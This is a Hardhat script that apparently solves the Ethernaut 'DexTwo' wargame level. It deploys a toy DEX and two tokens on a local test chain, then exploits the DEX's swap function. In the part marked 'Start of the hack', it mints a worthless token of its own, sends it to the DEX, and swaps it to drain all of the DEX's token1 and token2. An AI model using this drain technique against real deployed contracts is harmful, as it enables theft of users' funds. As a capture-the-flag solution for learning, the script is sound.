const { ethers } = require("hardhat");

async function main() {
  let dexAddress = "";
  const myAddress = "0x90F79bf6EB2c4f870365E785982E1f101E93b906";
  // Setup phase
  let dex = null;
  // If we have a DEX address, we attach to it
  if (dexAddress) {
    const Dex = await ethers.getContractFactory("Dex");
    dex = await Dex.attach(dexAddress);

    console.log(
      `DexTwo attached to ${dex.address} with owner ${await dex.owner()}`
    );
  } else {
    // If we don't have a DEX address, we deploy it
    const Dex = await ethers.getContractFactory("Dex");
    dex = await Dex.deploy();
    await dex.deployed();
    dexAddress = dex.address;
    console.log(
      `Dex deployed to ${dexAddress} with owner ${await dex.owner()}`
    );

    const SwappableTokenTwo = await ethers.getContractFactory(
      "SwappableTokenTwo"
    );
    const swappableTokenTwo1 = await SwappableTokenTwo.deploy(
      dex.address,
      "Swappable Token 1",
      "STT1",
      110
    );
    await swappableTokenTwo1.deployed();
    const swappableTokenTwo2 = await SwappableTokenTwo.deploy(
      dex.address,
      "Swappable Token Two 2",
      "STT2",
      110
    );
    await swappableTokenTwo2.deployed();
    console.log(`swappableToken1 deployed to ${swappableTokenTwo1.address}`);
    console.log(`swappableToken2 deployed to ${swappableTokenTwo2.address}`);

    await dex.setTokens(swappableTokenTwo1.address, swappableTokenTwo2.address);

    await dex.approve(dex.address, 100);
    await dex.addLiquidity(swappableTokenTwo1.address, 100);
    await dex.addLiquidity(swappableTokenTwo2.address, 100);

    console.log(
      "Added 100 tokens from each swappable token to the dex from the owner"
    );

    await dex.approve(await dex.owner(), 10);
    await swappableTokenTwo1.transferFrom(await dex.owner(), myAddress, 10);
    await swappableTokenTwo2.transferFrom(await dex.owner(), myAddress, 10);

    console.log(
      "Transferred 10 tokens from each swappable token to my address"
    );
  }

  // Start of the hack
  const mySigner = await ethers.getSigner(myAddress);
  const token1Address = await dex.token1();
  const token2Address = await dex.token2();

  // Creating my own token
  const SwappableTokenTwo = await ethers.getContractFactory(
    "SwappableTokenTwo"
  );
  const swappableTokenTwo3 = await SwappableTokenTwo.connect(mySigner).deploy(
    myAddress,
    "Swappable Token Two 3",
    "STT3",
    1000001
  );
  await swappableTokenTwo3.deployed();

  const token3Address = swappableTokenTwo3.address;
  console.log("Created my own token at", token3Address);
  console.log(await swappableTokenTwo3.connect(mySigner).balanceOf(myAddress));
  await swappableTokenTwo3.connect(mySigner).approve(myAddress, myAddress, 1);
  await swappableTokenTwo3
    .connect(mySigner)
    .transferFrom(myAddress, dexAddress, 1);

  console.log("Sent 1 token to the dex");

  await swappableTokenTwo3
    .connect(mySigner)
    .approve(myAddress, dexAddress, 1000000);
  console.log("Approved dex to spend all my tokens");

  let amountToSwap = await dex.balanceOf(token3Address, dexAddress);
  await dex.connect(mySigner).swap(token3Address, token1Address, amountToSwap);

  amountToSwap = await dex.balanceOf(token3Address, dexAddress);
  await dex.connect(mySigner).swap(token3Address, token2Address, amountToSwap);

  console.log(
    `DEX: ${await dex.balanceOf(
      token1Address,
      dexAddress
    )},${await dex.balanceOf(token2Address, dexAddress)}`
  );
  console.log(
    `ME: ${await dex.balanceOf(token1Address, myAddress)},${await dex.balanceOf(
      token2Address,
      myAddress
    )}`
  );

  console.log("Done");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
